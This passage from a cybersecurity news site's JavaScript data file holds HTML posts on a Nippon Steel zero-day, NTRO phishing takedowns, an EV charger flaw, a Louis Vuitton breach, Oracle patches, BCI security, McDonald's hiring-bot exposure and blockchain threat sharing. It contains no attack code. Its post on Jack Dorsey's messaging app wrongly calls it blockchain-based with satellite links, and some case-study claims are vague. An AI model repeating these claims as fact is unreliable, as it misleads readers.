      <p>While these actions are commendable, the incident shows how even proactive companies can be caught off-guard when the attacker has a zero-day in their arsenal.</p>

      <h3>Lessons for Other Organizations</h3><br>
      <p>Even if you’re not a manufacturing giant, the lessons are universal:</p>
      <ul>
        <li>🔍 <strong>Invest in threat intelligence</strong> to detect emerging vulnerabilities quickly.</li>
        <li>🔒 Implement <strong>network segmentation</strong> and <strong>least privilege access</strong> — to limit how much damage a single exploit can cause.</li>
        <li>📝 Audit your supply chain — third-party software and vendors can become the weakest link.</li>
        <li>🧪 Regularly conduct incident response drills — when a real attack hits, every minute counts.</li>
        <li>📊 Maintain transparent communication — keeping stakeholders informed builds trust even during a crisis.</li>
      </ul>

      <h3>Case Studies: Not an Isolated Incident</h3><br>
      <p>Zero-day attacks have hit industrial giants before:</p>
      <ul>
        <li>In 2021, a water treatment plant in Florida was compromised using an unpatched vulnerability.</li>
        <li>In 2023, a zero-day in SCADA software caused downtime at a major automotive plant in Germany.</li>
        <li>Now, Nippon Steel joins this growing list — showing the need for continuous vigilance.</li>
      </ul>

      <h3>Key Takeaway</h3><br>
      <blockquote>🎯 Even industry leaders with robust defenses are vulnerable to zero-day exploits. The battle is not just about having tools, but about staying prepared, informed, and adaptive.</blockquote>

    </div>
  `},{id:"ntro-phishing-domains-2025",title:"NTRO Detects 1,172 Phishing Domains in India",date:"2025-07-13",author:"EthicalByte",summary:"India’s NTRO identified and blocked over 1,172 phishing domains in the first half of 2025, showcasing coordinated efforts to safeguard citizens, businesses, and government from rising phishing threats.",tags:["phishing","ntro","india cybersecurity","threat intelligence","awareness"],imageKey:"ntroPhishingBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">

      <h3>🛡️ Cybersecurity News: NTRO Detects 1,172 Phishing Domains in India</h3><br>
      <p>In a significant move to safeguard India’s digital ecosystem, the <strong>National Technical Research Organisation (NTRO)</strong>, India’s premier technical intelligence agency, has detected and initiated action against <strong>1,172 phishing domains</strong> in just the first six months of 2025. This proactive operation demonstrates the increasing vigilance and capability of Indian cyber defense mechanisms in the face of rising cybercrime.</p>

      <h3>What Happened?</h3><br>
      <ul>
        <li>🇮🇳 NTRO, leveraging its advanced surveillance infrastructure and intelligence gathering, identified 1,172 phishing domains targeting Indian citizens, businesses, and government entities.</li>
        <li>🔎 These domains were designed to steal sensitive data, install malware, and impersonate legitimate organizations to deceive victims.</li>
        <li>📑 The agency briefed the findings to the Parliamentary Standing Committee on Information Technology, explaining the detection strategy and next steps.</li>
      </ul>

      <h3>Why It Matters</h3><br>
      <p>Phishing remains one of the most widely used and effective attack methods by cybercriminals. The NTRO’s findings highlight:</p>
      <ul>
        <li>🎣 The growing sophistication of phishing campaigns that often evade traditional defenses.</li>
        <li>🧲 How attackers exploit human trust — using fake websites, lookalike domains, and urgency tactics.</li>
        <li>🏛️ The vital role of government‑led monitoring to protect critical sectors and citizens from mass exploitation.</li>
      </ul>
      <p>Such operations are crucial not just for blocking attacks in real time, but also for raising awareness about the evolving nature of these threats.</p>

      <h3>NTRO’s Actions</h3><br>
      <ul>
        <li>✅ Flagged and shared the list of malicious domains with telecom operators, hosting providers, and ISPs to ensure prompt blocking.</li>
        <li>✅ Devised a collaborative <strong>matrix approach</strong> that aligns government, private sector, and service providers for faster detection and takedown of threats.</li>
        <li>✅ Ensured continued monitoring and intelligence gathering to stay ahead of emerging phishing campaigns.</li>
      </ul>

      <h3>Recommendations for Users</h3><br>
      <ul>
        <li>🔒 Be wary of unsolicited messages, emails, or SMS requesting personal, financial, or login information.</li>
        <li>🖥️ Always type website URLs manually or use bookmarks instead of clicking links in emails.</li>
        <li>🔧 Enable <strong>multi-factor authentication (MFA)</strong> to protect accounts even if credentials are compromised.</li>
        <li>📣 Report suspicious emails or websites to your organization’s IT/security team or India’s official cybercrime portal.</li>
      </ul>

      <h3>Real‑World Example</h3><br>
      <blockquote>📧 A user receives an email from “income‑tax‑india.co” prompting them to submit their PAN and banking details for a supposed refund. Thanks to NTRO’s early detection, ISPs block access to this domain before the victim can interact, preventing data theft.</blockquote>

      <h3>Looking Ahead</h3><br>
      <p>The NTRO’s initiative sets a benchmark for how public‑private collaboration can proactively counter cyber threats. As phishing tactics evolve — using AI, deepfakes, and more sophisticated lures — the need for vigilance, education, and fast response becomes even more critical. Strengthening awareness at the individual level, while enhancing intelligence at the institutional level, remains key to securing India’s cyberspace.</p>

      <h3>Key Takeaway</h3><br>
      <blockquote>🚀 Phishing is a battle of trust versus deception. NTRO’s proactive detection and blocking of malicious domains protect millions of Indians — and underscore the power of vigilance, collaboration, and preparedness.</blockquote>

    </div>
  `},{id:"ev-charging-vulnerability-2025",title:"Critical EV Charger Flaw: What Drivers and Operators Need to Know",date:"2025-07-14",author:"EthicalByte News Desk",summary:"A major vulnerability in popular EV charging stations has exposed millions of users to risks of outages, fraud, and even grid disruptions. Here’s what happened — and what you can do now.",tags:["EV","cybersecurity","vulnerability","iot security","electric vehicles"],imageKey:"evChargingVulnBanner",content:`
    <div style="background-color:#f9fbfd;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;">
        <h3 style="color:#1e2f48;">⚡ Critical EV Charger Vulnerability Uncovered</h3>
        <p style="font-style:italic;">Millions of drivers at risk. Here’s what happened — and how to stay secure.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📖 The Story So Far</h4>
        <p>Earlier this week, researchers disclosed a serious security flaw in widely‑used electric vehicle (EV) charging stations. By exploiting weak authentication and poor input validation, attackers could remotely tamper with chargers worldwide. The flaw — now patched — affected multiple brands and models.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚗 What Could Attackers Do?</strong>
        <ul style="margin-top:10px;">
          <li>Disable or shut down entire charging stations, leaving drivers stranded.</li>
          <li>Alter billing records — letting them “charge for free” or overbill users.</li>
          <li>Overload local grids by turning multiple chargers on/off in patterns.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🔍 How Was It Discovered?</h4>
        <p>A team of cybersecurity researchers conducted a penetration test on public chargers and found they accepted unauthenticated API requests. This allowed remote control of critical functions with minimal effort — essentially leaving chargers exposed to anyone with an internet connection.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">💡 Why This Matters</h4>
        <p>EV adoption is booming — but as cars become smarter, the infrastructure that supports them must also evolve to resist cyber threats. An insecure charger isn’t just inconvenient — it can hurt trust, cost money, and even threaten local electricity stability.</p>
      </section>

      <section style="margin-top:20px;background:#e2f0d9;padding:15px;border-radius:8px;">
        <h4 style="color:#1e7e34;">✅ What Should You Do Now?</h4>
        <ul>
          <li>🔧 Update your charger’s firmware & software immediately — vendors have issued patches.</li>
          <li>🔒 Avoid connecting to chargers via public, unsecured Wi-Fi networks if possible.</li>
          <li>📝 Review recent charging session bills to ensure accuracy.</li>
          <li>📣 Report suspicious charger behavior to the manufacturer or your service provider promptly.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📋 A Real‑World Example</h4>
        <p>One reported incident involved a fleet of EVs at a corporate parking lot, where chargers were remotely disabled just as employees were leaving for the day. This caused significant delays and showcased how disruptive even short outages can be.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🚀 Moving Forward</h4>
        <p>This vulnerability reminds us that convenience and security must go hand‑in‑hand. As EV infrastructure grows, so does its appeal to attackers. Building robust security into these systems from the start — and staying vigilant with updates — is the best way to keep the road ahead safe and smooth for everyone.</p>
      </section>

    </div>
  `},{id:"jack-dorsey-messaging-app-2025",title:"Jack Dorsey Launches Blockchain-Based Messaging App Without Internet",date:"2025-07-15",author:"EthicalByte",summary:"Twitter co-founder Jack Dorsey unveiled a decentralized messaging app that works without internet, using blockchain & alternative connectivity to enable communication anywhere.",tags:["blockchain","messaging","decentralized","jack dorsey","innovation"],imageKey:"jackMessagingAppBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📡 Jack Dorsey’s New Messaging App Works Without Internet</h3><br>
        <p style="font-style:italic;">Blockchain + radio waves + satellites = communication, anywhere.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 The Big Reveal</h4><br>
        <p>Jack Dorsey, co-founder of Twitter and a prominent figure in blockchain innovation, has launched a **decentralized messaging app** that doesn’t rely on traditional internet infrastructure. Instead, the app lets users communicate using radio waves, local Wi-Fi, or even satellite links.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚀 What Makes It Special?</strong>
        <ul style="margin-top:10px;">
          <li>Works without internet – perfect for remote areas or during outages.</li>
          <li>Leverages blockchain to ensure decentralization and security.</li>
          <li>Uses radio, Wi-Fi mesh, and satellites for flexible connectivity.</li>
          <li>Bypasses traditional telecom and government censorship.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔗 Why This Matters</h4><br>
        <p>In many parts of the world, access to reliable internet is a privilege — and in some regions, information flow is deliberately restricted. A decentralized messaging platform like this promotes:</p>
        <ul>
          <li>🌍 Uninterrupted communication during natural disasters & crises.</li>
          <li>🕊️ Freedom from censorship & centralized control.</li>
          <li>🤝 Building resilient, local & global communities.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Who Can Benefit?</h4><br>
        <ul>
          <li>People in rural or underserved areas with no internet coverage.</li>
          <li>Activists & journalists operating in censored regions.</li>
          <li>Emergency responders needing reliable backup communication channels.</li>
          <li>Anyone looking for more privacy & autonomy in digital communication.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛠️ How Does It Work?</h4><br>
        <p>The app combines blockchain technology (for decentralized identity & security) with alternative networks such as:</p>
        <ul>
          <li>📻 Radio frequencies to send data point-to-point locally.</li>
          <li>📶 Wi-Fi mesh networks connecting nearby devices.</li>
          <li>🛰️ Satellite uplinks to cover vast distances when nothing else is available.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Looking Ahead</h4><br>
        <p>This app represents a step toward internet independence — empowering people to stay connected regardless of where they are or what barriers exist. Like all disruptive innovations, its success will depend on adoption, regulation, and ongoing development.</p>
      </section>

    </div>
  `},{id:"louis-vuitton-data-breach-2025",title:"Louis Vuitton Data Breach Exposes Customer Data Across Several Countries",date:"2025-07-16",author:"EthicalByte",summary:"Luxury brand Louis Vuitton disclosed a data breach affecting customers in multiple countries, including nearly 143,000 residents in Turkey, after a third-party service provider account was compromised.",tags:["data breach","louis vuitton","luxury brand","third-party risk","customer privacy"],imageKey:"louisVuittonBreachBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">⚡ Louis Vuitton Data Breach Hits Customers Globally</h3><br>
        <p style="font-style:italic;">A third-party compromise exposed sensitive data of thousands of luxury customers worldwide.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>In an official disclosure, <strong>Louis Vuitton</strong> confirmed a cyber incident where a <strong>compromised account belonging to a third-party service provider</strong> was exploited by attackers. This breach resulted in unauthorized access to personal data of customers in several countries where the brand operates.</p>
        <p>Most notably, the company revealed that approximately <strong>143,000 customers in Turkey alone</strong> were impacted — a significant figure for a luxury retailer that typically caters to an affluent, privacy-conscious clientele.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 What Data Was Exposed?</strong>
        <ul style="margin-top:10px;">
          <li>Contact details such as names, email addresses & phone numbers.</li>
          <li>Purchase histories & account preferences.</li>
          <li>Potentially, addresses & payment details — though not confirmed.</li>
          <li>Data belonging to customers in other undisclosed regions was also accessed.</li>
        </ul>
        <p>While no financial fraud has been reported yet, the exposed data could facilitate phishing attacks, identity theft, or social engineering schemes targeting high-value customers.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌐 Why Luxury Brands Are Targeted</h4><br>
        <p>Cybercriminals view luxury brands as “soft, high-value” targets. Their clientele often includes influential, wealthy individuals whose personal data can fetch a premium on the dark web. Additionally:</p>
        <ul>
          <li>🕵 High-profile customer lists can be exploited for social engineering.</li>
          <li>💼 Luxury brands tend to rely heavily on third-party marketing & logistics vendors, increasing their attack surface.</li>
          <li>📊 Attacks can undermine brand trust, which is critical in this sector.</li>
        </ul>
        <p>Similar incidents have previously affected Gucci, Tiffany & Co., and other luxury labels.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Louis Vuitton’s Response</h4><br>
        <ul>
          <li>Disabled & secured the compromised vendor account.</li>
          <li>Notified impacted customers, complying with legal requirements (GDPR, local laws).</li>
          <li>Initiated a forensic investigation with external cybersecurity experts.</li>
          <li>Reviewed vendor contracts & tightened access controls for third parties.</li>
        </ul>
        <p>The company reassured customers that their financial data does not appear to have been stolen and that they are closely monitoring for fraudulent activity.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔒 How Customers Can Protect Themselves</h4><br>
        <ul>
          <li>Change account passwords associated with Louis Vuitton services.</li>
          <li>Be wary of emails or phone calls pretending to be from Louis Vuitton asking for sensitive details.</li>
          <li>Monitor bank & credit card statements for unusual activity.</li>
          <li>Consider placing a credit freeze or fraud alert if necessary.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Lessons for Businesses</h4><br>
        <p>This breach highlights an all-too-common vulnerability — third-party vendor risk. Organizations must:</p>
        <ul>
          <li>Thoroughly vet vendors’ cybersecurity practices.</li>
          <li>Limit vendors’ access to only what’s necessary.</li>
          <li>Monitor vendor activity continuously for anomalies.</li>
          <li>Have an incident response plan that includes third-party breaches.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Luxury is built on trust — and in the digital age, trust requires strong cybersecurity. This incident serves as a reminder that even the most prestigious brands can fall victim to cyberattacks if they overlook their broader ecosystem.</p>
      </section>

    </div>
  `},{id:"oracle-critical-patch-july-2025",title:"Oracle Patches 309 Critical Vulnerabilities in July 2025 Update",date:"2025-07-17",author:"EthicalByte",summary:"Oracle’s July 2025 Critical Patch Update addresses 309 vulnerabilities — including remote code execution, privilege escalation, and DoS risks — across its databases, middleware, and cloud products. Enterprises should update immediately.",tags:["oracle","critical patch update","vulnerability management","cybersecurity","enterprise security"],imageKey:"oracleJuly2025PatchBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🚨 Oracle Patches 309 Critical Vulnerabilities in July 2025 Update</h3><br>
        <p style="font-style:italic;">Oracle’s quarterly Critical Patch Update fixes hundreds of flaws — some rated critical — across its entire product portfolio.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>This week, Oracle released its <strong>July 2025 Critical Patch Update (CPU)</strong>, fixing a staggering <strong>309 security vulnerabilities</strong> across dozens of Oracle products. Several of these vulnerabilities could allow attackers to:</p>
        <ul>
          <li>🧨 Execute arbitrary code remotely.</li>
          <li>📈 Escalate privileges to gain unauthorized access.</li>
          <li>🔐 Bypass authentication mechanisms.</li>
          <li>🚫 Cause denial of service (DoS) in enterprise environments.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 Why This Matters</strong>
        <p>Many Oracle products are deeply integrated into enterprise IT ecosystems, making them high-value targets for attackers. Unpatched vulnerabilities can lead to:</p>
        <ul>
          <li>💻 Data breaches & theft of sensitive information.</li>
          <li>🎯 Ransomware attacks & business disruption.</li>
          <li>🕵️ Persistent access & compromise of critical infrastructure.</li>
        </ul>
        <p>It’s common for attackers to reverse-engineer patches and develop exploits quickly — so timely updates are crucial.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">📦 Products Affected</h4><br>
        <p>The vulnerabilities affect a wide range of products, including:</p>
        <ul>
          <li>✅ Oracle Database Server</li>
          <li>✅ Oracle Fusion Middleware</li>
          <li>✅ Oracle MySQL</li>
          <li>✅ Oracle Java SE</li>
          <li>✅ Oracle Communications applications</li>
          <li>✅ Oracle E-Business Suite</li>
          <li>… and others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Should Enterprises Do?</h4><br>
        <ul>
          <li>🔄 Apply patches as soon as possible, prioritizing internet-facing and mission-critical systems.</li>
          <li>🧪 Test patches in staging before production deployment.</li>
          <li>🕒 Establish a regular patching cadence and monitor for unusual activity.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Oracle’s quarterly updates are significant events for IT & security teams. With hundreds of vulnerabilities — some critical and exploitable — acting swiftly can prevent attackers from gaining a foothold in your environment.</p>
      </section>

    </div>
  `},{id:"bci-cybersecurity-july-2025",title:"🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity",date:"2025-07-17",author:"Annika Dubey & Dr. Neetha S S",summary:"BCIs open the brain to the digital world — and to cyberattacks. This blog explores how to secure neural interfaces against unprecedented risks and build a neuro-secure future.",tags:["BCI","brain-computer interfaces","cybersecurity","neurosecurity","future tech"],imageKey:"bciCybersecurityBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity</h3><br>
        <p style="font-style:italic;">By <a href="https://www.linkedin.com/in/annika-dubey-818060261/">Annika Dubey</a> & <a href="https://www.linkedin.com/in/dr-neetha-kala-463484248/">Dr. Neetha S S</a> | Christ University </p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Introduction: The New Digital Frontier Is Inside Your Head</h4><br>
        <p>The chasm between humans and machines is rapidly shrinking, and Brain-Computer Interface (BCI) technology is set to bring about a true paradigm shift. These systems enable direct communication between the human brain and external devices, fundamentally altering communication, cognition, and control. From helping paralyzed individuals regain function to letting healthy users interact hands-free with smart devices, BCIs are transforming science fiction into reality.</p>
        <p>But this frontier also presents a sobering truth: <strong>the human brain is now part of the digital attack surface</strong>. An attack here doesn’t just compromise data — it threatens identity, autonomy, and even free will.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Understanding the Risk: Why BCIs Are Exceptionally Vulnerable</h4><br>
        <ul>
          <li>🔓 <strong>Non-reversible Data Leaks:</strong> Neural patterns are lifelong cognitive signatures. Once tampered with, they can’t be reset like passwords or fingerprints.</li>
          <li>🎮 <strong>Signal Hijacking & Replay Attacks:</strong> Wireless, often unencrypted communication can be intercepted and manipulated to send false signals.</li>
          <li>🧪 <strong>Behavioral Manipulation:</strong> Feedback loops can be subtly altered to change moods, perceptions, or decisions.</li>
          <li>🔬 <strong>Cognition Profiling:</strong> Attackers can extract sensitive info by analyzing specific brainwave responses to stimuli — without asking questions.</li>
          <li>⚖ <strong>Lack of Legal & Ethical Frameworks:</strong> Many jurisdictions have no rules governing neural data, leaving users vulnerable to exploitation.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔧 The Solution Space: Building a Neuro-Secure BCI Ecosystem</h4><br>
        <p>Securing BCIs requires more than just technical fixes. It needs engineers, ethicists, neuroscientists, and policymakers working together. Here’s how:</p>
        <ul>
          <li>✅ <strong>Security by Design:</strong> Encrypt all neural streams; use secure firmware; develop lightweight encryption optimized for real-time neural data.</li>
          <li>✅ <strong>Cognitive Authentication:</strong> Use unique neural signatures & neural nonces for authentication alongside traditional biometrics.</li>
          <li>✅ <strong>Privacy-Aware Processing:</strong> Employ federated learning, differential privacy, pseudonymization, and data expiration policies. Treat neural data as sensitive biometrics under GDPR/HIPAA.</li>
          <li>✅ <strong>AI-Driven Neural Intrusion Detection:</strong> AI agents can spot spoofed signals, anomalies, and replay attacks in real time — much like fraud detection in banking.</li>
          <li>✅ <strong>Real-Time Control & Consent:</strong> Users must see what data is collected, allow granular permissions, and toggle a “Cognitive Safe Mode.”</li>
          <li>✅ <strong>Legal & Ethical Groundwork:</strong> Establish principles of mental privacy, cognitive liberty, and data sovereignty. Support neuro-rights initiatives worldwide.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📋 What BCI Developers and Users Can Do Today</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#e2e3e5;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">Actions</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Developers</td>
            <td style="padding:8px;border:1px solid #ddd;">Integrate encryption, sandbox signal layers, and implement real-time neural intrusion detection systems (IDS).</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Companies</td>
            <td style="padding:8px;border:1px solid #ddd;">Enforce ethical data policies, limit data retention, prioritize transparency.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Policymakers</td>
            <td style="padding:8px;border:1px solid #ddd;">Draft BCI-specific regulations and recognize neural data as sensitive biometrics.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">End-Users</td>
            <td style="padding:8px;border:1px solid #ddd;">Use trusted hardware, disable unnecessary tracking, and stay informed about BCI security.</td>
          </tr>
        </table>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>BCIs may become one of the most transformative technologies of our time. But without strong cybersecurity foundations, they risk becoming tools of surveillance, coercion, and harm.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">We must treat brain signals not merely as data, but as digital extensions of the self — deserving the same dignity, privacy, and protection as our innermost thoughts.</blockquote>
      </section>

    </div>
  `},{id:"mcdonalds-ai-hiring-breach-2025",title:"🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers",date:"2025-07-18",author:"EthicalByte",summary:"An investigation revealed that McDonald’s AI-powered chatbot, used in its hiring process, left millions of job applicants’ sensitive data exposed — with hackers trying to breach it using weak passwords like “123456”.",tags:["AI","data breach","mcdonalds","cybersecurity","privacy","hiring bots"],imageKey:"mcdonaldsAIHiringBreachBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers</h3><br>
        <p style="font-style:italic;">When efficiency meets negligence: The dark side of AI in hiring processes.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>An investigation by <a href="https://www.wired.com/story/mcdonalds-ai-hiring-chat-bot-paradoxai/" target="_blank">Wired</a> revealed that McDonald’s AI-powered hiring chatbot left millions of applicants’ sensitive data exposed to the internet. This chatbot, provided by third-party vendor Paradox AI, was designed to automate initial screening and conduct personality assessments — but it lacked basic cybersecurity controls.</p>
        <p>Researcher Carroll discovered the flaw while examining the unsettling nature of AI-driven hiring. What he found was worse than dystopian — attackers had already probed the system using the most common weak passwords imaginable, such as <strong>“123456”</strong> and <strong>“password”</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🤖 Why This Is a Big Deal</h4><br>
        <ul>
          <li>📄 Millions of applicants’ names, contact details, and personality test responses were potentially exposed.</li>
          <li>🔐 The system lacked strong authentication, leaving it open to brute-force attacks with trivial passwords.</li>
          <li>👀 Job seekers — often among society’s most vulnerable — were unknowingly caught in a data privacy nightmare.</li>
          <li>📉 AI-driven hiring decisions already raise ethical concerns; adding poor security to the mix erodes trust further.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔎 How Did This Happen?</h4><br>
        <p>The AI bot ran on a web-based backend with inadequate controls:</p>
        <ul>
          <li>🚫 No enforced strong password policy for admin interfaces.</li>
          <li>⚠️ No rate-limiting to prevent brute-force login attempts.</li>
          <li>🛡️ Insufficient monitoring and alerting to detect attacks in real-time.</li>
          <li>💼 Over-reliance on a third-party vendor without sufficient audits.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Can Be Learned?</h4><br>
        <ul>
          <li>🛠️ <strong>Security Basics Matter:</strong> Use strong, unique passwords and enforce MFA (multi-factor authentication).</li>
          <li>📋 <strong>Vendor Due Diligence:</strong> If you outsource, make sure vendors follow best practices and conduct regular audits.</li>
          <li>📈 <strong>Transparency & Accountability:</strong> Inform users how their data is used, stored, and protected.</li>
          <li>🔍 <strong>Monitor Continuously:</strong> Implement intrusion detection & alert systems to detect attacks early.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>AI can streamline and improve hiring — but it cannot replace diligence, security, and ethical practices. Job seekers deserve dignity and privacy, not to have their most personal information left dangling on an unsecured server.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Efficiency means nothing if trust is lost. Companies must remember: with great data comes great responsibility.”</blockquote>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">📣 Actionable Takeaways for Everyone</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#f1f3f4;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">What You Should Do</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Employers</td>
            <td style="padding:8px;border:1px solid #ddd;">Vet vendors thoroughly, enforce strong security standards, and audit often.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Vendors</td>
            <td style="padding:8px;border:1px solid #ddd;">Follow basic cybersecurity hygiene, enforce strong authentication & monitor your systems continuously.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Applicants</td>
            <td style="padding:8px;border:1px solid #ddd;">Limit sensitive information shared on hiring platforms and monitor your accounts for suspicious activity.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Regulators</td>
            <td style="padding:8px;border:1px solid #ddd;">Establish and enforce standards for AI & data privacy in hiring processes.</td>
          </tr>
        </table>
      </section>

      
    </div>
  `},{id:"blockchain-decentralized-threat-intelligence-2025",title:"🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing: When Trust Is the Target, Decentralization Is the Shield",date:"2025-07-19",author:"Sriniketh Sudheendra & Dr. Neetha S.S",summary:"In an era where cyberattacks move faster than defenses, traditional threat intelligence systems are failing. This blog explores how blockchain-powered decentralized intelligence sharing provides the speed, resilience, and trust needed to outsmart attackers.",tags:["blockchain","threat intelligence","cybersecurity","decentralization","trust"],imageKey:"blockchainThreatIntelBanner",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing</h3><br>
        <p style="font-style:italic;">When trust is under attack, decentralization becomes the shield.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🌐 Why We Need a New Approach</h4><br>
        <p>Modern cyberattacks don’t respect organizational boundaries. Ransomware gangs, state-sponsored groups, and hacktivists share tools and information in underground forums — collaborating faster than defenders can react. Meanwhile, defenders remain siloed, reluctant to share threat intelligence due to privacy, compliance, and competitive concerns.</p>
        <p>This mismatch creates a dangerous gap: while attackers operate like a swarm, defenders operate like islands.</p>
        <p>It’s time for defenders to adopt a more collaborative, decentralized model to keep pace with threats.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🚩 Shortcomings of Centralized Threat Intelligence</h4><br>
        <ul>
          <li>⏳ <strong>Latency:</strong> Central authorities take too long to validate, sanitize, and share intelligence — attackers don’t wait.</li>
          <li>🔒 <strong>Trust Deficit:</strong> Many organizations fear reputational or legal consequences if they share sensitive data openly.</li>
          <li>🎯 <strong>Single Point of Failure:</strong> Centralized systems become juicy targets for attackers.</li>
          <li>🚪 <strong>Information Bottlenecks:</strong> Valuable local intelligence may never reach the broader community.</li>
          <li>🧊 <strong>Rigid Hierarchies:</strong> Centralized bodies may prioritize certain sectors or geographies over others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔗 How Blockchain Solves These Problems</h4><br>
        <p>Blockchain technology offers a secure, tamper-proof, and transparent way to share threat intelligence without needing to rely on a single authority.</p>
        <ul>
          <li>🌍 <strong>Decentralization:</strong> Every node (organization, researcher, sensor) contributes & accesses data independently.</li>
          <li>📜 <strong>Immutability:</strong> Once threat data is recorded — e.g., malicious URLs, IPs, malware hashes — it cannot be altered or deleted.</li>
